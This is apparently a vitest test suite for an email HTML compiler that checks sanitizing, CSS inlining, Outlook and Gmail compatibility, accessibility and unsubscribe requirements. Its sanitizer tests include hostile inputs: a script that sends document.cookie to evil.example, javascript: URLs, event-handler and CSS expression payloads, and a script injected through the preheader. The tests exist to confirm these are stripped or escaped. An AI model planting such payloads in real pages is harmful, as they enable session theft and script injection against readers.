import { describe, expect, it } from "vitest";
import { compileEmail, starterEmailHtml } from "./compile.js";
import { inlineEmailCss, specificityOf } from "./inline.js";
import { sanitizeEmailHtml } from "./sanitize.js";
import { contrastRatio, toPlainText, validateEmailHtml } from "./validate.js";

const BRAND = {
  colors: ["#101828", "#ffffff", "#1570ef"],
  fontStacks: ["arial, helvetica, sans-serif"],
  contentWidthPx: 600,
  unsubscribePlaceholder: "{{unsubscribe_url}}",
  postalAddress: "1 Example Street, Berlin",
};

const rules = (report: { findings: Array<{ rule: string }> }): string[] =>
  report.findings.map((finding) => finding.rule);

describe("email sanitizing", () => {
  it("removes script and reports it rather than deleting quietly", () => {
    const result = sanitizeEmailHtml(
      `<div><script>fetch('https://evil.example/'+document.cookie)</script><p>Hello</p></div>`,
    );
    expect(result.html).not.toContain("<script");
    expect(result.html).toContain("Hello");
    // An author whose email came back half-empty needs to know why.
    expect(result.findings.map((finding) => finding.rule)).toContain(
      "email.forbidden-element",
    );
  });

  it("strips event handlers wherever they appear", () => {
    const result = sanitizeEmailHtml(
      `<a href="https://example.com" onclick="steal()" onmouseover="x()">Go</a>`,
    );
    expect(result.html).not.toMatch(/onclick|onmouseover/i);
    expect(result.html).toContain("https://example.com");
  });

  it("refuses javascript:, data: and relative URLs", () => {
    const result = sanitizeEmailHtml(
      `<a href="javascript:alert(1)">a</a>
       <a href="/relative">b</a>
       <img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="c">`,
    );
    expect(result.html).not.toContain("javascript:");
    expect(result.html).not.toContain("data:image");
    // A relative link has no base once the message is in an inbox.
    expect(result.html).not.toContain('href="/relative"');
  });

  it("keeps an ESP merge tag, which is not a URL but must survive", () => {
    // Stripping this would remove the legally required unsubscribe link from
    // every template the product builds.
    for (const tag of ["{{unsubscribe_url}}", "*|UNSUB|*", "%%unsub%%"]) {
      const result = sanitizeEmailHtml(`<a href="${tag}">Unsubscribe</a>`);
      expect(result.html).toContain(tag);
    }
  });

  it("removes CSS that can execute", () => {
    const result = sanitizeEmailHtml(
      `<div style="width: expression(alert(1)); behavior: url(x.htc); color: #101828;">hi</div>`,
    );
    expect(result.html).not.toMatch(/expression|behavior/i);
    // The safe declaration beside them survives.
    expect(result.html).toContain("#101828");
  });

  it("removes form controls, which no email client submits", () => {
    const result = sanitizeEmailHtml(
      `<form action="https://example.com"><input name="email"><button>Send</button></form>`,
    );
    expect(result.html).not.toMatch(/<form|<input|<button/i);
  });

  it("adds the frame a client needs to render predictably", () => {
    const result = sanitizeEmailHtml(`<p>Hello</p>`);
    expect(result.html).toContain('charset="utf-8"');
    expect(result.html).toContain('name="viewport"');
    expect(result.html).toContain('lang="en"');
  });
});

describe("css inlining", () => {
  it("moves stylesheet declarations onto elements", () => {
    const result = inlineEmailCss(
      `<html><head><style>p { color: #101828; }</style></head><body><p>Hi</p></body></html>`,
    );
    expect(result.html).toContain('style="color: #101828"');
    expect(result.html).not.toContain("<style");
  });

  it("applies the more specific rule last", () => {
    const result = inlineEmailCss(
      `<html><head><style>
         p { color: #ff0000; }
         .lead { color: #00ff00; }
         #hero { color: #0000ff; }
       </style></head><body><p id="hero" class="lead">Hi</p></body></html>`,
    );
    expect(result.html).toContain("#0000ff");
    expect(result.html).not.toContain("#ff0000");
  });

  it("lets a hand-written inline style win over the stylesheet", () => {
    // Something written directly on the element is the most specific
    // statement of intent in the document.
    const result = inlineEmailCss(
      `<html><head><style>p { color: #ff0000; }</style></head>
       <body><p style="color: #101828;">Hi</p></body></html>`,
    );
    expect(result.html).toContain("#101828");
    expect(result.html).not.toContain("#ff0000");
  });

  it("retains media queries, which cannot be inlined at all", () => {
    const result = inlineEmailCss(
      `<html><head><style>
         @media (max-width: 600px) { .col { width: 100% !important; } }
       </style></head><body><div class="col">Hi</div></body></html>`,
    );
    expect(result.retainedCss).toContain("@media");
    expect(result.retainedCss).toContain("100%");
  });

  it("retains pseudo-classes, which have no inline equivalent", () => {
    const result = inlineEmailCss(
      `<html><head><style>a:hover { color: #1570ef; }</style></head>
       <body><a href="https://example.com">Hi</a></body></html>`,
    );
    expect(result.retainedCss).toContain(":hover");
  });

  it("reports selectors that matched nothing", () => {
    const result = inlineEmailCss(
      `<html><head><style>.typo { color: red; }</style></head><body><p>Hi</p></body></html>`,
    );
    expect(result.unusedSelectors).toContain(".typo");
  });

  it("orders specificity the way a browser does", () => {
    expect(specificityOf("#id")).toEqual([1, 0, 0]);
    expect(specificityOf(".a.b")).toEqual([0, 2, 0]);
    expect(specificityOf("div p")).toEqual([0, 0, 2]);
  });
});

describe("client compatibility validation", () => {
  const compile = (html: string, preheader = "A short preview line.") =>
    compileEmail({ html, subject: "Subject", preheader, brand: BRAND });

  it("names Outlook's Word engine when flexbox appears", () => {
    const result = compile(`<div style="display: flex;">a</div>`);
    const finding = result.report.findings.find(
      (entry) => entry.rule === "email.outlook-unsupported",
    );
    // The message has to say which client and what it does, because that is
    // what an author or an agent can act on.
    expect(finding?.message).toMatch(/Microsoft Word/);
    expect(finding?.affects.join(" ")).toMatch(/Outlook/);
    expect(result.report.ok).toBe(false);
  });

  it("does not complain about display values Word can handle", () => {
    const result = compile(`<div style="display: block;">a</div>`);
    expect(rules(result.report)).not.toContain("email.outlook-unsupported");
  });

  it("requires alt text, because Outlook blocks images by default", () => {
    const result = compile(`<img src="https://example.com/a.png" width="600">`);
    const finding = result.report.findings.find(
      (entry) => entry.rule === "email.image-missing-alt",
    );
    expect(finding?.severity).toBe("error");
    expect(finding?.message).toMatch(/blocks remote images/i);
  });

  it("accepts an empty alt on a decorative image", () => {
    const result = compile(
      `<img src="https://example.com/a.png" width="600" alt="">`,
    );
    expect(rules(result.report)).not.toContain("email.image-missing-alt");
  });

  it("flags a layout table that screen readers will misread", () => {
    const result = compile(`<table><tr><td>a</td></tr></table>`);
    expect(rules(result.report)).toContain("email.table-missing-role");
  });

  it("measures contrast rather than guessing at it", () => {
    expect(contrastRatio("#000000", "#ffffff")).toBeCloseTo(21, 1);
    expect(contrastRatio("#ffffff", "#ffffff")).toBeCloseTo(1, 5);

    const result = compile(
      `<p style="color: #bbbbbb; background-color: #ffffff;">Low</p>`,
    );
    const finding = result.report.findings.find(
      (entry) => entry.rule === "email.low-contrast",
    );
    expect(finding).toBeDefined();
    expect(finding?.message).toMatch(/4\.5:1/);
  });

  it("requires the unsubscribe placeholder and postal address", () => {
    const result = compile(`<p>Buy things</p>`);
    expect(rules(result.report)).toContain("email.missing-unsubscribe");
    expect(rules(result.report)).toContain("email.missing-postal-address");
  });

  it("warns when a font stack has nothing to fall back to", () => {
    const result = compile(`<p style="font-family: Brandon Grotesque;">Hi</p>`);
    const finding = result.report.findings.find(
      (entry) => entry.rule === "email.font-stack-no-fallback",
    );
    expect(finding?.message).toMatch(/ignore web fonts/i);
  });

  it("reports off-brand colours without silently rewriting them", () => {
    const result = compile(`<p style="color: #ff00ff;">Hi</p>`);
    const finding = result.report.findings.find(
      (entry) => entry.rule === "email.off-brand-color",
    );
    // Info, not error: a shade outside the palette is often deliberate, and
    // changing it would alter a design decision without telling anyone.
    expect(finding?.severity).toBe("info");
    expect(
      result.report.findings.some(
        (entry) => entry.rule === "email.off-brand-color",
      ),
    ).toBe(true);
  });

  it("reports Gmail clipping with the real threshold", () => {
    const result = compile(`<p>${"padding ".repeat(20_000)}</p>`);
    expect(result.report.gmailClips).toBe(true);
    const finding = result.report.findings.find(
      (entry) => entry.rule === "email.gmail-clipping",
    );
    expect(finding?.message).toMatch(/102KB/);
    expect(finding?.message).toMatch(/unsubscribe/i);
  });

  it("treats a sanitizer removal as blocking, because the document changed", () => {
    const result = compile(`<p>Hi</p><script>alert(1)</script>`);
    expect(result.report.counts.blocking).toBeGreaterThan(0);
    expect(result.report.ok).toBe(false);
  });
});

describe("compiled output", () => {
  it("hides the preheader and stops clients scraping past it", () => {
    const result = compileEmail({
      html: `<p>Body</p>`,
      subject: "Subject",
      preheader: "The preview line",
    });
    expect(result.compiledHtml).toContain("The preview line");
    expect(result.compiledHtml).toContain("mso-hide:all");
    // Without the spacer, the preview continues into the body text.
    expect(result.compiledHtml).toContain("&zwnj;");
  });

  it("escapes the preheader rather than trusting it", () => {
    const result = compileEmail({
      html: `<p>Body</p>`,
      subject: "Subject",
      preheader: `<script>alert(1)</script>`,
    });
    expect(result.compiledHtml).not.toContain("<script>alert");
    expect(result.compiledHtml).toContain("&lt;script&gt;");
  });

  it("derives plain text carrying link destinations", () => {
    const text = toPlainText(
      `<html><body><p>Read the <a href="https://example.com/post">announcement</a>.</p></body></html>`,
    );
    // "click here" means nothing once the markup is gone.
    expect(text).toContain("announcement <https://example.com/post>");
  });

  it("compiles the starter document with nothing blocking or broken", () => {
    const result = compileEmail({
      html: starterEmailHtml({
        contentWidthPx: 600,
        bodyFont: "Arial, Helvetica, sans-serif",
        headingFont: "Arial, Helvetica, sans-serif",
        background: "#ffffff",
        surface: "#ffffff",
        text: "#101828",
        accent: "#1570ef",
        companyName: "Example GmbH",
        postalAddress: "1 Example Street, Berlin",
        unsubscribePlaceholder: "{{unsubscribe_url}}",
      }),
      subject: "Launch",
      preheader: "What shipped this week.",
      brand: BRAND,
    });

    // The starter has to pass, or it is not a starting point.
    expect(result.report.counts.blocking).toBe(0);
    expect(result.report.counts.error).toBe(0);
    expect(result.report.ok).toBe(true);
  });

  it("reports size honestly for a small email", () => {
    const report = validateEmailHtml({
      html: "<html><body><p>Hi</p></body></html>",
      preheader: "Hi",
      subject: "Hi",
    });
    expect(report.sizeBytes).toBeGreaterThan(0);
    expect(report.gmailClips).toBe(false);
  });
});
